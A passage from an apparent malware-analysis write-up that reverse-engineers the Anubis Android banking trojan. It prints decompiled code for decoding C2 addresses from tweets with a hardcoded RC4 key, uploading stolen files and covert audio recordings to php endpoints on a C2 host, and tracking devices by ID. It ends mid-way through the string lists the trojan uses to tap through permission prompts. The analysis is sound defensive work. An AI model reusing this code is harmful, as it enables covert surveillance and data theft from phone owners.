well. this makes sense. Every chinese character in the `str` is replaced with an alphanumerical value. From that, we can assume the intended response for the http request to the url  `https://twitter.com/qweqweqwe` is an html filled with chinese characters and every character in between `"苏尔的开始", ` and `"苏尔苏尔完"` is will be stored in `str`, which will then be replaced with alphanumerical characters.

After the loop, `str` is reassigned to the return value of `SomeHttpClass.mo230d(this.str)`.

```java
    public String mo230d(String str) {
        this.consts2.getClass();
        return mo226c(str, "zanubis");
    }
```

Alright i guess this is how this malware got its name :). anyways, this method does nothing but calling another method with our string and `zanubis` as an arguments. And i think we should trace it with frida.

```javascript
'use strict';

if (Java.available) {
    Java.perform(function() {
        var java_string = Java.use("java.lang.String");
        var some_http_class = Java.use("wocwvy.czyxoxmbauu.slsa.b");
        some_http_class.d.overload('java.lang.String').implementation = function(x) {
            send("[*] method called SomeHttpClass.mo230d(\""+x+"\")");
            var ret = this.d(x);
            if (ret != undefined) {
                send(" => return: "+ ret);
                return ret;
            }
            else {
                send(" => return: undefined");
                return Java.use('java.lang.String').$new("undefined");
            }
        }
    });
}
```
```sh
[!] callback -> [*] method called SomeHttpClass.mo230d("ZWViZGQ3NjRjOGZlOWNjMjAzODhhNzFhNzg4MDJi
")
[!] callback ->  => return: http://cdnjs.su
[!] callback -> [*] method called SomeHttpClass.mo230d("ZWViZGQ3NjRjOGZlOWNjMjAzODhhNzFhNzg4MDJi
")
[!] callback ->  => return: http://cdnjs.su
[!] callback -> [*] method called SomeHttpClass.mo230d("")
[!] callback ->  => return: 
[!] callback -> [*] method called SomeHttpClass.mo230d("")
[!] callback ->  => return: 
```
It seems like `MakeTwitterRequest` is not the only function that calls `SomeHttpClass.mo230d()`. And doesnt that string looks familiar? yaee.. its the same string we saw in the shared preference xml file.

```xml
<string name="urls">ZWViZGQ3NjRjOGZlOWNjMjAzODhhNzFhNzg4MDJi&#10;    </string>
```
and the return value is a url. `http://cdnjs.su`, it is the same url that we met when we were analyzing 
`SomeHttpClass.mo234e` with frida, which will return after its been decoded if we request `url` key from the shared 
preference. So my assumption on `SomeHttpClass.mo226c` being a decoder function is true!

Since the web request that malware returns an empty string, we get nothing decoded :(.

take a look at `SomeHttpClass.mo226c`.

```java
    public String mo226c(String str, String str2){
        try {
            return new String(new C0063a(str2.getBytes()).mo358a(mo223b(new String(Base64.decode(str, 0), "UTF-8"))));
        } catch (Exception unused) {
            return "";
        }
    }
```
So it does look like this function is not only a decoder but also a decrypter. Let's take a look at class `C0063a`.

```
/* rename this to RC4 */
public class C0063a {

    [... code here]

    public C0063a(byte[] bArr) {
        this.f485a = m305c(bArr);
    }
```
`C0063a` constructor calls another method.

```java
    private int[] m305c(byte[] key) {
        int[] iArr = new int[256];
        for (int i = 0; i < 256; i++) {
            iArr[i] = i;
        }
        int i2 = 0;
        for (int i3 = 0; i3 < 256; i3++) {
            i2 = (((i2 + iArr[i3]) + key[i3 % key.length]) + 256) % 256;
            swap(i3, i2, iArr);
        }
        return iArr;
    }
```

So what this does is, creates an int array of size 256, fill it with numbers from 0 - 255, loop through 0 - 255 and
do below expression 

        i2 = (((i2 + iArr[i3]) + key[i3 % key.length]) + 256) % 256;

well this looks like rc4 algorithm. swap function is pretty simple.

then the array is returned and following method is applied on it by the `SomeHttpClass.mo226c` method. 

```java
    private int[] m305c(byte[] bArr) {
        int[] iArr = new int[256];
        for (int i = 0; i < 256; i++) {
            iArr[i] = i;
        }
        int i2 = 0;
        for (int i3 = 0; i3 < 256; i3++) {
            i2 = (((i2 + iArr[i3]) + bArr[i3 % bArr.length]) + 256) % 256;
            swap(i3, i2, iArr);
        }
        return iArr;
    }
```

aand this confirms the assumption that this malware uses **rc4 algorithm**. However, unlike many other malware, anubis seems to use a **hardcoded key**, rather than generating a key on the fly, which is `zanubis`.

As a summery what `MakeTwitterRequest` does is, 

        - sends a requests to the url `https://twitter.com/qweqweqwe`, which contains tweets in chinese.
        - read the response html in to a buffer and remove all the spaces.
        - save the string in between `苏尔的开始`, `苏尔苏尔完` of the response html in `str`.
        - for each chinese character in `str`, replace it with a corresponding alphanumerical character (which results in a base64 encoded string).
        - decode base64 encoded string in `str` and decrypt it using RC4, with key being equal to `zanubis` 
        - store return value back in `str`.

However we dont really know what malware expects from the reponse html and what is the use of decoded and decrypted data. But i suspect main purpose of this snippet is to extract **C2 server addresses from the tweets of the user**. 

Now we can move onto another interesting methods of the `SomeHttpClass`. 

```java
    public String mo218b(Context context, String str, String str2) {
        C0067b bVar = new C0067b();
        String str3 = "";
```

method expects two string arguments other than the context argument. first, it initialize new variables, an object of 
class `C0067b` and a string.

then,

```java
        if (str.equals("1")) {
            str3 = "/o1o/a3.php";
        }
        if (str.equals("2")) {
            str3 = "/o1o/a4.php";
        }
        if (str.equals("3")) {
            str3 = "/o1o/a5.php";
        }
        if (str.equals("4")) {
            str3 = "/o1o/a6.php";
        }
        if (str.equals("5")) {
            str3 = "/o1o/a7.php";
        }
        if (str.equals("6")) {
            str3 = "/o1o/a8.php";
        }
        if (str.equals("7")) {
            str3 = "/o1o/a9.php";
        }
        if (str.equals("10")) {
            str3 = "/o1o/a10.php";
        }
        if (str.equals("11")) {
            str3 = "/o1o/a11.php";
        }
        if (str.equals("12")) {
            str3 = "/o1o/a12.php";
        }
        if (str.equals("13")) {
            str3 = "/o1o/a13.php";
        }
        if (str.equals("14")) {
            str3 = "/o1o/a14.php";
        }
        if (str.equals("15")) {
            str3 = "/o1o/a15.php";
        }
```

there's a bunch of if statements, each checks whether the first string argument is equal to some number. if so, it appends `/o1o/a(x).php` to the previously initialized string `str3`. Well those strings looks like **php endpoints** but the domain is not specified here. 

```java
    try {
            String e = getSharedPreference(context, "url");
            return bVar.mo363a(e + str3, str2);
        } catch (Exception unused) {
            mo213a("ERROR", "Class nwtdtqovhkgkna, POST -> URL");
            return null;
        }
    }
```

inside the try block we see a call to a famililar method, getSharedPreference. In this case key is `"url"`. 
well if search the xml, you wont find any.

here is what method `mo363a` does,

```java
    /* renamed from: a */
    public String mo363a(String str, String str2) {
        SomeHttpClass bVar = new SomeHttpClass();
        AsyncTaskC0079a aVar = new AsyncTaskC0079a();
        aVar.execute(str, str2);
        try {
            return bVar.GetMiddleString((String) aVar.get(), "<tag>", "</tag>");
        } catch (Exception unused) {
            return "";
        }
    }
```

So i guess this is what we saw earlier when we hooked the function that parses response html from the twitter request with frida.
Basically this method starts a HttpConnection and send the required information to the target **php endpoint**. Therefore we can rename the method to `exfiltrate`.

Now the problem is, how is this thing retrieving value of a shared preference with a non-existing key?

Probably because malware is generating and writing the url dynamically to the xml. Let's analyze the method that makes use of above **php endpoints**.

```java
public void mo211a(Context context, String str, String str2, String str3) { 
        String e = getSharedPreference(context, "websocket");
        StringBuilder sb = new StringBuilder();
        sb.append(e);
        this.consts2.getClass();
        sb.append("/o1o/a1.php");
        String sb2 = sb.toString();
        
        [... more code]
```

above method calls `getSharedPreference` with key being equal to `websocket` and append the return value to a `StringBuilder sb`.
well if we grep that part out from the xml,


```sh
   <string name="websocket"></string>
```
it's empty. Well my guess is that this will be filled later by the malware.

then `sb` is appended with `/o1o/a1.php`, which is a **php endpoint**, and the resulting string (url) is stored in `sb2`. 

```java
        File file = new File(str);
        byte[] a = ReadFile(file);
        if (str2.equals("")) {
            str2 = mo247q(context) + "-" + file.getName();
        }
```
then it creates a file taking the second argument as the filename and passes the file as an argument to `SomeHttpClass.ReadFile`. then it check if third argument (`str2`) is an empty string, if so, it calls another method named `SomeHttpClass.mo247q`, concatanate the return value with `-` and the file's name.

first of all, all what `ReadFile` method does is, as the name implies, reading a file and returning it as a byte array.
in this case, it reads file specified in `str` and returns the contents, which will then be stored in byte array `a`.

Now let's take a look at `SomeHttpClass.mo247q`.

```java
    public String mo247q(Context context) {
        String string = Settings.Secure.getString(context.getContentResolver(), "android_id");
        if (string != "") {
            return string;
        }
        return "35" + (Build.BOARD.length() % 10) + (Build.BRAND.length() % 10) + (Build.CPU_ABI.length() % 10) + (Build.DEVICE.length() % 10) + (Build.DISPLAY.length() % 10) + (Build.HOST.length() % 10) + (Build.ID.length() % 10) + (Build.MANUFACTURER.length() % 10) + (Build.MODEL.length() % 10) + (Build.PRODUCT.length() % 10) + (Build.TAGS.length() % 10) + (Build.TYPE.length() % 10) + (Build.USER.length() % 10);
    }
```

So its clear that this function is simply is getting the **SSAID** of the current user/app. 
However, if it is failed to extract this information, it creates a unique ID by adding 35 to the remainders of various IDs when they are divided by 10. 

My assumption is that, malware might be using this **SSAID to keep a track on devices**.


```java 
        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(sb2).openConnection();
        httpURLConnection.setUseCaches(false);
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
        httpURLConnection.setRequestProperty("Cache-Control", "no-cache");
        httpURLConnection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + "*****");
```

in the above snippet, method `SomeHttpClass.mo211a` creates a new HttpURLConnection to the url stored in `sb2`. then it modifies some attributes of the Http
Connection. for example, it first sets `UseCaches` to false, `DoOutput` to true and `RequestMethod` to `"POST"`, and it suggests that the request method this method is going to use is "POST". It also sets RequestProperties like, `"Connection"` to `"Keep-Alive"`, `"Cache-Control"` to `"no-cache"` and `"Content-Type"` to `"multipart/form-data;boundary=*****"`

```java
        DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
        dataOutputStream.writeBytes("--" + "*****" + "\r\n");
        StringBuilder sb3 = new StringBuilder();
        sb3.append("Content-Disposition: form-data; name=\"serverID\"");
        sb3.append("\r\n");
        dataOutputStream.writeBytes(sb3.toString());
        dataOutputStream.writeBytes("\r\n");

```

then it creates a `DataOutputStream` out from the HttpURLConnection it created before. then it writes following string to the output stream.

`--*****\r\n`

another StringBuilder is created named `sb3` and the string 

    "Content-Disposition: form-data; name=\"serverID\""\r\n" 

is appended to it. then `sb3` is converted into a string and written to the output steam it opened before.

```java
        dataOutputStream.write("getfiles".getBytes());
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.writeBytes("--" + "*****" + "--" + "\r\n");
```

then following strings 

    getfiles\r\n
    --*****--\r\n

```java
        StringBuilder sb4 = new StringBuilder();
        sb4.append("--");
        sb4.append("*****");
        sb4.append("\r\n");
        dataOutputStream.writeBytes(sb4.toString());
```

then again, 

    --****\r\n

is written.

```java
        dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"" + str3 + "\";filename=\"" + str2 + "\"" + "\r\n");
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.write(a);
        dataOutputStream.writeBytes("\r\n");
        dataOutputStream.writeBytes("--" + "*****" + "--" + "\r\n");
        dataOutputStream.flush();
        dataOutputStream.close();
```

here its writing some strings to the output stream again first one being

"Content-Disposition: form-data; name=\"" + str3 + "\";filename=\"" + str2 + "\"" + "\r\n\r\n",

aaaaand guess what is next? the file it read earlier, which stored in byte array `a`.
From that, it can be concluded that this method is doing some data exfiltration work.

then again, it writes another string to the output stream.

    --*****--\r\n

and then output stream is flushed and closed. 

Well then what are those weird strings and what is the file? well i think those are some kind of markers to indicate end and start of the stream. maybe im wrong. who knows.

```java
        BufferedInputStream bufferedInputStream = new BufferedInputStream(httpURLConnection.getInputStream());
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));
        StringBuilder sb5 = new StringBuilder();
        while (true) {
            String readLine = bufferedReader.readLine();
            if (readLine != null) {
                sb5.append(readLine);
                sb5.append("\n");
            } else {
                bufferedReader.close();
                mo213a("HTTP", "HTTPRESPONSE: " + sb5.toString());
                bufferedInputStream.close();
                httpURLConnection.disconnect();
                return;
            }
        }
    }
```

at the end of the method, we can see it creates an input stream out of the http connection, as well as a buffer reader. 
then a StringBuilder is also declared. 

the loop will continue until the local `readline` is not equal to null. and if so, it appends StringBuilder with the line that just read.

else, it closes both BufferedReader and BufferedInputStream and disconnects the HttpURLConnection.


let's scan the decompiled code to indentify cross references so we can get an idea about which files will be sent to the endpoint. (I renamed the method to `SendFileToEndpoint` so that it makes more sense :3 )

![cross references](/img/anubis/anubis_crossreferences.png)
 
### Audio Recording

and if we click one those cross references, we'll end up inside a runnable thread.

```java
    public void mo417a(final Context context, final String str, final int i) {
        final MediaRecorder mediaRecorder = new MediaRecorder();
        this.cls.mo213a("SOUND", "START RECORD SOUND");
        this.f523b = false;
        mediaRecorder.setAudioSource(1);
        mediaRecorder.setOutputFormat(3);
        mediaRecorder.setAudioEncoder(1);
        mediaRecorder.setOutputFile(str);
```

Well this looks scary but yeah. we see a **MediaRecorder** is being initialized. then it starts recording sound and set AudioSource to **AMR_NB**, OutputFormat to **AMR_NB**, AudioEncoder to **AMR_NB** and OutputFile to `str`, which is the second parameter.

```java
        Thread thread = new Thread(new Runnable() {

            public void run() {
                SomeHttpClass bVar;
                String str;
                StringBuilder sb;
```

this is the runnable thread part i talked above. here it does nothing other than declaring some variables.

```java
                try {
                    Thread.sleep((long) (i * 1000));
                    AudioRecord.this.cls.mo213a("SOUND", "STOP RECORD SOUND");
                    try {
                        mediaRecorder.stop();
                        mediaRecorder.release();
                        AudioRecord.this.f523b = true;
                        Log.e("FILE", "" + str);
                        AudioRecord.this.cls.SendFileToEndpoint(context, str, "", "sound[]");
                    } catch (Exception e) {
                        e = e;
                        bVar = AudioRecord.this.cls;
                        str = "ERROR";
                        sb = new StringBuilder();
                        sb.append("Record Sound! ");
                        sb.append(e);
                        bVar.mo213a(str, sb.toString());
                    }
```

inside the try block, we can it calls Thread.sleep for i * 1000, where `i` is the third parameter.
we see another call `SomeHttpClass.mo213a` but this time with `"STOP RECORD SOUND"` as the second argument (compared to the previous call's second argument being "START RECORD SOUND"). So it looks like the function starts recording audio, sleep for user (in this case programmer) specified time and stop recording.

then there's try block inside the try block, which basically stops the mediaRecorder and release it. then it sets some boolean variable to true, i guess which is responsible to tracking if it is still recording audio or not (and im gonna rename it to something that makes more sense). 

then we see what we ve been expecting to see, the cross references. it passes `str` as the second argument (filename) and an empty string and `sound[]` as third and fouth arguments.

inside the catch block, it just creates a string containing the error and pass it to `SomeHttpClass.mo213a`.

```java
                } catch (InterruptedException unused) {
                    AudioRecord.this.cls.mo213a("SOUND", "STOP RECORD SOUND");
                    try {
                        mediaRecorder.stop();
                        mediaRecorder.release();
                        AudioRecord.this.f523b = true;
                        Log.e("FILE", "" + str);
                        AudioRecord.this.cls.SendFileToEndpoint(context, str, "", "sound[]");
                    } catch (Exception e2) {
                        e = e2;
                        bVar = AudioRecord.this.cls;
                        str = "ERROR";
                        sb = new StringBuilder();
                        sb.append("Record Sound! ");
                        sb.append(e);
                        bVar.mo213a(str, sb.toString());
                    }

                    [... another catch block that does the same thing]
                }
            }
        });
```

`SomeHttpClass.mo213a` is called with the same argument as the try block. Inside it, theres another try catch block, both do the same thing as the previous try block.


same applies to this block too...

```java
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            thread.start();
        } catch (IOException unused) {
        }
    }
```

this is the block that actually starts the thread :).
Soo what this method actually does is, it starts recording audio on the given source, waits until `i` amount of time and stops recording. then it calls our `SomeHttpClass.SendFileToEndpoint` method to send it to an endpoint so attacker can receive the file.

### Banking Apps

Lets get an idea of how this malware gets banking applications.

```java
/* renamed from: wocwvy.czyxoxmbauu.slsa.a */
public class BankingApps {

    /* renamed from: h */
    public static final String[] f321h = "[az]aktivləşdirmək::[sq]aktivizoni::[am]የሚሰጡዋቸውን::[en]activate::[ar]تفعيل::[hy]ակտիվացնել::[af]aktiveer::[eu]aktibatu::[ba]актив::[be]актываваць::[bn]সক্রিয়::[my]သက်ဝင်::[bg]активира::[bs]aktiviraj::[cy]activate::[hu]aktiválja::[vi]kích hoạt::[ht]aktive::[gl]activar::[nl]activeren::[mrj]активировать::[el]ενεργοποίηση::[ka]გააქტიურება::[gu]સક્રિય::[da]aktivere::[he]הפעל::[yi]אַקטאַווייט::[id]mengaktifkan::[ga]gníomhachtaigh::[is]virkja::[es]activar::[it]attivare::[kk]іске қосу::[kn]ಸಕ್ರಿಯಗೊಳಿಸಿ::[ca]activar::[ky]активировать::[zh]激活::[ko]활성화::[xh]sebenzisa::[km]ធ្វើឱ្យ::[lo]ກະຕຸ້ນ::[la]eu::[lv]aktivizēt::[lt]įjungti::[lb]aktivéieren::[mk]активирајте::[mg]mampihetsika::[ms]mengaktifkan::[ml]സജീവമാക്കുക::[mt]jattiva::[mi]whakahohe::[mr]सक्रिय::[mhr]чӱкташ::[mn]идэвхжүүлэх::[de]aktivieren::[ne]सक्रिय::[no]aktiver::[pa]ਸਰਗਰਮ::[pap]primi::[fa]فعال::[pl]aktywować::[pt]activar::[ro]activa::[ru]активировать::[ceb]activate::[sr]активирај::[si]ක්රියාත්මක::[sk]aktivácia::[sl]vključi::[sw]kuamsha::[su]aktipkeun::[tl]i-activate::[tg]фаъол::[th]เปิดใช้งาน::[ta]செயல்படுத்த::[tt]активировать::[te]సక్రియం::[tr]etkinleştirmek::[udm]активировать::[uz]faollashtirish::[uk]активувати::[ur]چالو::[fi]aktivoi::[fr]activer::[hi]सक्रिय::[hr]aktivirati::[cs]aktivovat::[sv]aktivera::[gd]gnìomhaich::[eo]aktivigi::[et]aktiveerige::[jv]ngaktifake::[ja]活性化".split("::");

    /* renamed from: i */
    public static final String[] f322i = "[az]Yandırmaq üçün giriş::[sq]Mundësimi i aksesit për::[am]ደረጃ መድረስ ደረጃ አልተሰጠውም::[en]Enable access for::[ar]تمكين الوصول إلى::[hy]Միացնել մուտք::[af]In staat stel om toegang vir::[eu]Gaitu sarbidea::[ba]Эсенә инеү өсөн::[be]Уключыце доступ для::[bn]এক্সেস সক্রিয় জন্য::[my]ဖစ္ရပ္တည္ႏေ::[bg]Включете достъп за::[bs]Omogućiti pristup::[cy]Galluogi mynediad ar gyfer::[hu]Hozzáférés engedélyezése a::[vi]Cho phép truy cập cho::[ht]Pèmèt aksè pou::[gl]Posibilitar o acceso para::[nl]Toegang voor::[mrj]Пыртен кердеш::[el]Ενεργοποιήστε την πρόσβαση για::[ka]საშუალებას დაშვება::[gu]સક્રિય ઍક્સેસ માટે::[da]Aktiver adgang til::[he]לאפשר גישה::[yi]געבן צוטריט פֿאַר::[id]Mengaktifkan akses untuk::[ga]A chumas rochtain a fháil ar do::[is]Virkja aðgang::[es]Habilitar el acceso para::[it]Abilitare l'accesso per::[kk]Қосыңыз қол жеткізу үшін::[kn]ಸಕ್ರಿಯಗೊಳಿಸಿ ಪ್ರವೇಶ::[ca]Permetre l'accés per::[ky]Включите кирүү үчүн::[zh]使访问::[ko]활성화에 대한 액세스::[xh]Yenza ukufikelela kuba::[km]បើកការចូលដំណើរសម្រាប់::[lo]ເຮັດໃຫ້ສາມາດເຂົ້າເຖິງສໍາລັບ::[la]Morbi accessum ad::[lv]Ieslēdziet piekļuve::[lt]Įjunkite galimybė::[lb]Veröffentlechen Si den Accès fir::[mk]Им овозможи пристап за::[mg]Alefaso ny fidirana ho::[ms]Akses untuk membolehkan::[ml]Enable access വേണ്ടി::[mt]Tippermetti l-aċċess għall -::[mi]Taea ai te whai wāhi mō te::[mr]सक्षम प्रवेश::[mhr]Пураш пурташ::[mn]Идэвхжүүлэх хандах::[de]Schalten Sie den Zugang für::[ne]पहुँच सक्षम पार्नुहोस् ��ागि::[no]Tillat tilgang for::[pa]ਯੋਗ ਲਈ ਪਹੁੰਚ::[pap]Abilidat di aceso na::[fa]فعال کردن دسترسی برای::[pl]Włącz dostęp do::[pt]Habilite o acesso para::[ro]Activați acces pentru::[ru]Включите доступ для::[ceb]Paghimo access alang sa::[sr]Укључите приступ за::[si]සක්රීය ප්රවේශය සඳහා::[sk]Povoliť prístup pre::[sl]Omogočanje dostopa za::[sw]Kuwawezesha access kwa ajili ya::[su]Ngaktipkeun aksés pikeun::[tl]Paganahin ang pag-access para sa::[tg]Рӯй оид ба дастрасӣ ба::[th]เปิดใช้งานสำหรับเข้าถึง::[ta]இயக்கு அனுமதி::[tt]Включите керү өчен::[te]ఎనేబుల్ యాక్సెస్ కోసం::[tr]Açın ve erişim için::[udm]Гожтоно кариськи понна::[uz]Uchun kirish imkonini beradi::[uk]Увімкніть доступ для::[ur]قابل رسائی کے لئے::[fi]Mahdollistaa pääsyn::[fr]Activer l'accès pour::[hi]पहुँच सक्षम करें के लिए::[hr]Uključite pristup za::[cs]Povolte přístup pro::[sv]Aktivera åtkomst för::[gd]Cuir cothrom airson::[eo]Ebligi aliron por::[et]Lülitage juurdepääs::[jv]Ngaktifake akses kanggo::[ja]アクセスのための".split("::");

    /* renamed from: j */
    public static final String[] f323j = "[az]İzin ver::[sq]Të lejojë::[am]የሚሰጡዋቸውን::[en]Allow::[ar]تسمح::[hy]Լուծել::[af]Laat::[eu]Baimendu::[ba]Рөхсәт::[be]Дазволіць::[bn]অনুমতি::[my]ခွင့်ပြု::[bg]Оставя се::[bs]Dozvoliti::[cy]Caniatáu::[hu]Lehetővé teszi,::[vi]Cho phép::[ht]Pèmèt::[gl]Permitir::[nl]Toestaan::[mrj]Разрешӓйӹ::[el]Επιτρέπεται::[ka]საშუალებას::[gu]પરવાનગી આપે છે::[da]Tillad::[he]לאפשר::[yi]לאָזן::[id]Memungkinkan::[ga]Cheadú::[is]Leyfa::[es]Permitir::[it]Consentire::[kk]Рұқсат етілсін::[kn]ಅವಕಾಶ::[ca]Permetre::[ky]Уруксат::[zh]允许::[ko]용::[xh]Vumela::[km]អនុញ្ញាត::[lo]ອະນຸຍາດ::[la]Sino::[lv]Atļaut::[lt]Leisti::[lb]Zulassen::[mk]Дозволете::[mg]Mamela::[ms]Membenarkan::[ml]അനുവദിക്കുക::[mt]Tippermetti::[mi]Tukua::[mr]परवानगी::[mhr]Кӧнеда::[mn]Зөвшөөрөх::[de]Zulassen::[ne]अनुमति::[no]La::[pa]ਸਹਾਇਕ ਹੈ::[pap]Permití::[fa]اجازه می دهد::[pl]Pozwól::[pt]Permitir::[ro]Permite::[ru]Разрешить::[ceb]Pagtugot::[sr]Дозволи::[si]ඉඩ::[sk]Povoliť::[sl]Dovolite,::[sw]Kuruhusu::[su]Ngidinan::[tl]Payagan ang mga::[tg]Иҷозат::[th]อนุญาต::[ta]அனுமதிக்க::[tt]Игъланнары::[te]అనుమతిస్తుంది.::[tr]İzin ver::[udm]Разрешить::[uz]Ruxsat::[uk]Дозволити::[ur]کی اجازت::[fi]Salli::[fr]Autoriser::[hi]की अनुमति::[hr]Dopusti::[cs]Povolit::[sv]Tillåta::[gd]Ceadaich::[eo]Permesi::[et]Luba::[jv]Ngidini::[ja]許可".split("::");

    /* renamed from: k */
    public static final String[] f324k = "[az]Bəli::[sq]Po::[am]አዎ::[en]Yes::[ar]نعم::[hy]Այո::[af]Ja::[eu]Bai::[ba]Д::[be]Ды::[bn]হ্যাঁ::[my]ဟုတ်ကဲ့::[bg]Да::[bs]- ::[cy]Ie::[hu]Igen::[vi]Yes::[ht]Wi::[gl]Si::[nl]Ja::[mrj]Мане::[el]Ναι::[ka]დიახ::[gu]હા::[da]Ja::[he]כן::[yi]יא::[id]Ya::[ga]Tá::[is]Já::[es]Sí::[it]Sì::[kk]Иә::[kn]ಹೌದು::[ca]Sí::[ky]Ооба::[zh]是的::[ko]네::[xh]Ewe::[km]បាទ::[lo]ແມ່ນແລ້ວ::[la]Etiam::[lv]Jā::[lt]Taip::[lb]Jo::[mk]Yes::[mg]Eny::[ms]Ya::[ml]അതെ::[mt]Iva::[mi]Ae::[mr]होय::[mhr]Да::[mn]Тийм ээ::[de]Ja::[ne]हो::[no]Ja::[pa]ਜੀ::[pap]Sí::[fa]بله::[pl]Tak::[pt]Sim::[ro]Da::[ru]Да::[ceb]Oo::[sr]Да::[si]ඔව්::[sk]Áno::[sl]Da,::[sw]Ndiyo::[su]Enya::[tl]Oo::[tg]Ҳа::[th]ใช่แล้ว::[ta]ஆமாம்::[tt]Әйе::[te]అవును::[tr]Evet::[udm]Мед::[uz]Ha::[uk]Так::[ur]جی ہاں::[fi]Kyllä::[fr]Oui::[hi]हाँ::[hr]Da::[cs]Ano::[sv]Ja::[gd]Yes::[eo]Jes::[et]Jah::[jv]Ya::[ja]あり".split("::");

    /* renamed from: l */
    public static final String[] f325l = "[az]sil::[sq]uninstall::[am].::[en]uninstall::[ar]إلغاء::[hy]հեռացնել::[af]verwyder::[eu]desinstalatu::[ba]бөтөрөп::[be]выдаліць::[bn]আনইনস্টল::[my]ဖယ်ရှား::[bg]изтриете::[bs]deinstaliranje::[cy]uninstall::[hu]uninstall::[vi]rõ ràng::[ht]désinstaller::[gl]instrucións para::[nl]verwijderen::[mrj]удалена::[el]απεγκατάσταση::[ka]uninstall::[gu]અનઇન્સ્ટોલ કરો::[da]afinstaller::[he]הסרת התקנה::[yi]נעם אַוועק::[id]uninstall::[ga]treoracha::[is]flutningur::[es]desinstalar::[it]disinstallare::[kk]жою::[kn]ಅಸ್ಥಾಪಿಸು::[ca]desinstal · lar::[ky]таштоо::[zh]卸载::[ko]제거::[xh]imizekelo::[km]លុប::[lo]ຖ::[la]uninstall::[lv]atinstalēt::[lt]pašalinti::[lb]deinstallieren::[mk]деинсталирање::[mg]fanesorana::[ms]pemasangan::[ml]അൺഇൻസ്റ്റാൾ::[mt]istruzzjonijiet::[mi]wetetāuta::[mr]विस्थापित::[mhr]кораҥдаш::[mn]устгах::[de]deinstallieren::[ne]स्थापना रद्द::[no]avinstaller::[pa]ਅਣ::[pap]dental::[fa]حذف::[pl]usunąć::[pt]desinstalação::[ro]dezinstalare::[ru]удалить::[ceb]uninstall::[sr]уклонити::[si]අස්ථාපනය කරන්න::[sk]odinštalovať::[sl]odstrani::[sw]kuondolewa::[su]uninstall::[tl]i-uninstall ang mga::[tg]чӣ тавр ба хориҷ::[th]ถอนการติดตั้ง::[ta]மென்பொருளை நீக்க::[tt]бетерә::[te]అన్ఇన్స్టాల్::[tr]Kaldır::[udm]палэнтыны::[uz]adware virus olib tashlash uchun::[uk]видалити::[ur]انسٹال::[fi]uninstall::[fr]désinstaller::[hi]स्थापना रद्द करें::[hr]izbrisati::[cs]odinstalovat::[sv]avinstallera::[gd]dì-stàlaich::[eo]uninstall::[et]uninstall::[jv]busak instal::[ja]アンインストール".split("::");

    /* renamed from: m */
    public static final String[] f326m = "[az]sil::[sq]për të hequr::[am]ማስወገድ::[en]to remove::[ar]لإزالة::[hy]հեռացնել::[af]te verwyder::[eu]kendu::[ba]бөтөрөп::[be]выдаліць::[bn]মুছে ফেলার জন্য::[my]ဖယ်ရှားရန်::[bg]изтриете::[bs]da ukloni::[cy]i gael gwared ar::[hu]eltávolítani::[vi]để loại bỏ::[ht]pou retire::[gl]para eliminar::[nl]verwijderen::[mrj]удалена::[el]διαγραφή::[ka]უნდა ამოიღონ::[gu]દૂર કરવા માટે::[da]for at fjerne::[he]כדי להסיר::[yi]צו באַזייַטיקן::[id]untuk menghapus::[ga]a bhaint::[is]til að fjarlægja::[es]eliminar::[it]rimuovere::[kk]жою::[kn]ತೆಗೆದುಹಾಕಲು::[ca]per eliminar::[ky]таштоо::[zh]删除::[ko]를 제거::[xh]ukususa::[km]ដើម្បីយកចេញ::[lo]ເພື່ອເອົາ::[la]ad tollendam::[lv]dzēst::[lt]pašalinti::[lb]ewechhuelen::[mk]за да се отстрани::[mg]mba hanesorana::[ms]untuk mengeluarkan::[ml]നീക്കം::[mt]biex tneħħi::[mi]ki te tango::[mr]काढा::[mhr]кораҥдаш::[mn]устгах::[de]entfernen::[ne]हटाउन::[no]for å fjerne::[pa]ਨੂੰ ਹਟਾਉਣ ਲਈ::[pap]kita::[fa]برای حذف::[pl]usunąć::[pt]remover::[ro]elimina::[ru]удалить::[ceb]aron sa pagpapahawa::[sr]уклонити::[si]ඉවත් කිරීමට::[sk]odstrániť::[sl]odstrani::[sw]kuondoa::[su]pikeun miceun::[tl]upang alisin::[tg]чӣ тавр ба хориҷ::[th]เพื่อลบ::[ta]நீக்க::[tt]бетерә::[te]తొలగించడానికి::[tr]sil::[udm]палэнтыны::[uz]olib tashlash uchun::[uk]видалити::[ur]کو ہٹانے کے لئے::[fi]poistaa::[fr]supprimer::[hi]को दूर करने के लिए::[hr]izbrisati::[cs]odstranit::[sv]för att ta bort::[gd]a thoirt air falbh::[eo]forigi::[et]kustuta::[jv]kanggo mbusak::[ja]除".split("::");

    /* renamed from: n */
    public static final String[] f327n = "[az]yandırmaq::[sq]përfshijnë::[am]ማካተት::[en]include::[ar]وتشمل::[hy]միացնել::[af]sluit::[eu]besteak beste::[ba]индереү::[be]ўключыць::[bn]অন্তর্ভুক্ত::[my]င္သည္။::[bg]включи::[bs]uključuju::[cy]yn cynnwys::[hu]tartalmazza::[vi]bao gồm::[ht]gen ladan yo::[gl]inclúen::[nl]zijn::[mrj]чӱктен::[el]ενεργοποίηση::[ka]მოიცავს::[gu]સમાવેશ થાય છે::[da]omfatter::[he]כוללים::[yi]אַרייַננעמען::[id]termasuk::[ga]san áireamh::[is]fela::[es]incluir::[it]includere::[kk]қосу::[kn]ಸೇರಿವೆ::[ca]incloure::[ky]киргизүүгө::[zh]包括::[ko]함::[xh]quka::[km]រួមមាន::[lo]ປະກອບ::[la]etiam::[lv]iekļaut::[lt]įjungti::[lb]einschalten::[mk]вклучуваат::[mg]ahitana::[ms]termasuk::[ml]include::[mt]jinkludu::[mi]ngā::[mr]यांचा समावेश आहे::[mhr]включатлаш::[mn]оруулах::[de]einschalten::[ne]समावेश::[no]inkluderer::[pa]ਵਿੱਚ ਸ਼ਾਮਲ ਹਨ::[pap]inclui::[fa]عبارتند از:::[pl]włączyć::[pt]incluir::[ro]include::[ru]включить::[ceb]naglakip 